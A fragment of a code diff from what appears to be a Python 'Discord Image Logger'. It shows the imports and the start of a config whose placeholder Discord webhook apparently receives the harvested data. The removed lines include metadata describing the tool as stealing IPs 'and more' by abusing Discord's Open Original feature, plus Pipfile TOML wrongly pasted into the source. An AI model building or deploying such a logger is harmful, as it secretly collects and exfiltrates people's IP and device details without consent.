@@ -5,22 +5,6 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-[[source]]
-url = "https://pypi.org/simple"
-verify_ssl = true
-name = "pypi"
- 
-[packages]
-flask = "*"
- 
-[requires]
-python_version = "3.9"
-
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
-
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/your/webhook",
